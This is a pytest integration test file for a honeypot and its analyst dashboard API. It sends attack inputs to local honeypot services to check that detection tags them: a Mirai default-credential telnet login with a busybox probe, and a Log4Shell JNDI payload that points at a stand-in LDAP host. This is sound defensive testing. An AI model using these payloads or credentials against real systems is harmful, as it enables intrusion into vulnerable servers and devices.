"""End-to-end integration tests.

Two layers, both against a real temp database:

1. **Live sensor round-trip.** Start an actual asyncio listener, connect a real
   TCP client, and assert the interaction lands in the database with the right
   tags. This is the only test that exercises the socket plumbing, the writer
   thread and the enrichment hook together — the parts unit tests deliberately
   skip.

2. **Pipeline + API.** Seed events, run detection and scoring, then drive the
   FastAPI app with its TestClient and assert the dashboard's endpoints return
   what the analyst needs.
"""

from __future__ import annotations

import asyncio
import datetime as dt
import socket
import uuid

import pytest
from fastapi.testclient import TestClient

from honeypot.config import Settings
from honeypot.logger import EventLogger
from honeypot.services.http_service import HTTPService
from honeypot.services.telnet_service import TelnetService
from honeypot.session import SessionRegistry
from storage.models import Event, EventType, Severity, utcnow


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _run(coro):
    """Run a coroutine to completion on a fresh event loop.

    Used instead of pytest-asyncio so the suite has no extra plugin dependency —
    one fewer thing that has to be installed for ``pytest`` to collect at all.
    """
    return asyncio.run(coro)


# --------------------------------------------------------------------------- #
# 1. Live sensor round-trip
# --------------------------------------------------------------------------- #


def test_telnet_captures_iot_login_and_command(engine, monkeypatch):
    """A telnet client using Mirai creds must produce tagged events in the DB."""
    _run(_telnet_iot_flow(engine))


async def _telnet_iot_flow(engine):
    settings = Settings()
    settings.write_to_db = True
    settings.jsonl_path = None
    settings.enrich_inline = False  # keep the test hermetic and fast
    settings.accept_login_rate = 1.0  # deterministic: always grant the shell

    logger = EventLogger(settings)
    logger.start()
    registry = SessionRegistry(settings)
    port = _free_port()
    service = TelnetService(settings, logger, registry, port)
    await service.start()

    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        await reader.read(256)  # greeting + "login:"
        writer.write(b"root\r\n")
        await writer.drain()
        await reader.read(256)  # "Password:"
        writer.write(b"xc3511\r\n")  # a known Mirai credential
        await writer.drain()
        await reader.read(512)  # motd + prompt
        writer.write(b"/bin/busybox ECCHI\r\n")
        await writer.drain()
        await reader.read(512)
        writer.write(b"exit\r\n")
        await writer.drain()
        writer.close()
        await writer.wait_closed()
    finally:
        await asyncio.sleep(0.2)  # let the server finish the session
        await service.stop()
        logger.stop()

    # The writer thread batches; give it a beat, then read back.
    from sqlalchemy import select

    from storage.db import session_scope

    with session_scope() as db:
        events = list(db.execute(select(Event)).scalars())

    by_type = {e.event_type for e in events}
    assert EventType.AUTH_ATTEMPT.value in by_type
    assert EventType.AUTH_SUCCESS.value in by_type
    assert EventType.COMMAND.value in by_type

    all_tags = {tag for e in events for tag in (e.tags or [])}
    assert "iot-default-credential" in all_tags
    assert "mirai-signature" in all_tags

    auth = next(e for e in events if e.event_type == EventType.AUTH_ATTEMPT.value)
    assert auth.username == "root"
    assert auth.password == "xc3511"


def test_http_flags_log4shell(engine):
    _run(_http_log4shell_flow(engine))


async def _http_log4shell_flow(engine):
    settings = Settings()
    settings.write_to_db = True
    settings.jsonl_path = None
    settings.enrich_inline = False

    logger = EventLogger(settings)
    logger.start()
    registry = SessionRegistry(settings)
    port = _free_port()
    service = HTTPService(settings, logger, registry, port)
    await service.start()

    payload = "/?x=${jndi:ldap://198.18.0.9:1389/a}"
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        request = (
            f"GET {payload} HTTP/1.1\r\nHost: t\r\nUser-Agent: curl/8\r\nConnection: close\r\n\r\n"
        )
        writer.write(request.encode())
        await writer.drain()
        await reader.read(4096)
        writer.close()
        await writer.wait_closed()
    finally:
        await asyncio.sleep(0.2)
        await service.stop()
        logger.stop()

    from sqlalchemy import select

    from storage.db import session_scope

    with session_scope() as db:
        events = list(db.execute(select(Event)).scalars())

    request_events = [e for e in events if e.event_type == EventType.HTTP_REQUEST.value]
    assert request_events
    assert "log4shell" in (request_events[0].tags or [])
    assert request_events[0].severity == Severity.CRITICAL.value


# --------------------------------------------------------------------------- #
# 2. Pipeline + API
# --------------------------------------------------------------------------- #


@pytest.fixture
def seeded_db(engine):
    """A modest, deterministic dataset written through the real write path."""
    from storage.db import session_scope
    from storage.models import Session as SessionRow

    base = utcnow() - dt.timedelta(hours=2)
    events: list[Event] = []
    sessions: list[SessionRow] = []

    # An SSH brute-force burst: 30 attempts in ~5 minutes from one source.
    sid = str(uuid.uuid4())
    sessions.append(
        SessionRow(
            session_id=sid,
            sensor="t",
            service="ssh",
            src_ip="192.0.2.100",
            src_port=1234,
            dst_port=22,
            started_at=base,
        )
    )
    for i in range(30):
        events.append(
            Event(
                event_id=str(uuid.uuid4()),
                ts=base + dt.timedelta(seconds=i * 8),
                sensor="t",
                session_id=sid,
                service="ssh",
                event_type=EventType.AUTH_ATTEMPT.value,
                severity=Severity.MEDIUM.value,
                src_ip="192.0.2.100",
                dst_port=22,
                username=f"user{i % 5}",
                password="123456",
                country="CN",
                country_name="China",
                latitude=31.2,
                longitude=121.4,
                asn=64512,
                as_org="Demo",
                threat_score=5.0,
                tags=["ssh-password"],
            )
        )

    # A benign single connect from another source.
    sid2 = str(uuid.uuid4())
    sessions.append(
        SessionRow(
            session_id=sid2,
            sensor="t",
            service="http",
            src_ip="198.51.100.5",
            dst_port=80,
            started_at=base,
        )
    )
    events.append(
        Event(
            event_id=str(uuid.uuid4()),
            ts=base,
            sensor="t",
            session_id=sid2,
            service="http",
            event_type=EventType.CONNECT.value,
            severity=Severity.INFO.value,
            src_ip="198.51.100.5",
            dst_port=80,
            country="US",
            country_name="United States",
            tags=[],
        )
    )

    with session_scope() as db:
        db.add_all(sessions)
        db.flush()
        db.add_all(events)

    from pipeline.detection.rules import run_detection
    from storage import queries

    with session_scope() as db:
        queries.rebuild_attackers(db)
    with session_scope() as db:
        run_detection(db, since_hours=48)

    return engine


@pytest.fixture
def client(seeded_db):
    from api.main import app

    with TestClient(app) as c:
        yield c


class TestAPI:
    def test_health_ok(self, client):
        body = client.get("/api/health").json()
        assert body["status"] == "ok"
        assert body["events_total"] == 31
        assert body["rules_loaded"] >= 15

    def test_summary(self, client):
        body = client.get("/api/stats/summary?hours=48").json()
        assert body["total_events"] == 31
        assert body["unique_attackers"] == 2
        assert body["auth_attempts"] == 30

    def test_events_pagination(self, client):
        body = client.get("/api/events?limit=10&since_hours=48").json()
        assert len(body["items"]) == 10
        assert body["total"] == 31

    def test_events_filter_by_service(self, client):
        body = client.get("/api/events?service=ssh&since_hours=48").json()
        assert body["total"] == 30
        assert all(e["service"] == "ssh" for e in body["items"])

    def test_bad_service_is_400(self, client):
        assert client.get("/api/events?service=bogus").status_code == 400

    def test_bruteforce_alert_generated(self, client):
        body = client.get("/api/alerts?since_hours=48").json()
        rule_ids = {a["rule_id"] for a in body["items"]}
        assert "ssh_bruteforce" in rule_ids

    def test_attacker_profile_has_score_and_explanation(self, client):
        body = client.get("/api/attackers/192.0.2.100").json()
        assert body["src_ip"] == "192.0.2.100"
        assert body["threat_score"] > 0
        assert body["classification"] is not None
        assert body["score_explanation"] is not None
        components = body["score_explanation"]["components"]
        assert abs(sum(components.values()) - body["score_explanation"]["raw_score"]) < 0.1

    def test_attacker_map_only_returns_geolocated(self, client):
        body = client.get("/api/attackers/map?hours=48").json()
        assert all(p["lat"] is not None and p["lon"] is not None for p in body["points"])

    def test_unknown_attacker_404(self, client):
        assert client.get("/api/attackers/192.0.2.254").status_code == 404

    def test_invalid_ip_400(self, client):
        assert client.get("/api/attackers/not-an-ip").status_code == 400

    def test_alert_status_update_flow(self, client):
        alerts = client.get("/api/alerts?since_hours=48").json()["items"]
        alert_id = alerts[0]["alert_id"]

        patched = client.patch(
            f"/api/alerts/{alert_id}", json={"status": "acknowledged", "notes": "triaged"}
        )
        assert patched.status_code == 200
        assert patched.json()["status"] == "acknowledged"
        assert patched.json()["notes"] == "triaged"

        # And it must persist.
        again = client.get(f"/api/alerts/{alert_id}").json()
        assert again["status"] == "acknowledged"

    def test_timeseries_fills_empty_buckets(self, client):
        body = client.get("/api/stats/timeseries?hours=48&bucket=1h&by=service").json()
        assert body["bucket"] == "1h"
        assert len(body["points"]) > 0
        # Every point carries a total, even the empty hours.
        assert all("total" in p for p in body["points"])

    def test_timeseries_rejects_too_many_points(self, client):
        assert client.get("/api/stats/timeseries?hours=8760&bucket=1m").status_code == 400

    def test_credentials_endpoint(self, client):
        body = client.get("/api/stats/credentials?hours=48").json()
        assert any(row["password"] == "123456" for row in body)

    def test_enrich_endpoint_labels_synthetic_vs_real(self, client):
        body = client.get("/api/stats/enrich/192.168.1.1").json()
        assert body["scope"] == "private"
        assert body["country"] is None  # private space is never geolocated

    def test_password_redaction_toggle(self, seeded_db, monkeypatch):
        monkeypatch.setenv("API_REDACT_PASSWORDS", "1")
        from api.main import app

        with TestClient(app) as c:
            body = c.get("/api/events?service=ssh&since_hours=48").json()
        assert all(e["password"] in ("[redacted]", None) for e in body["items"])
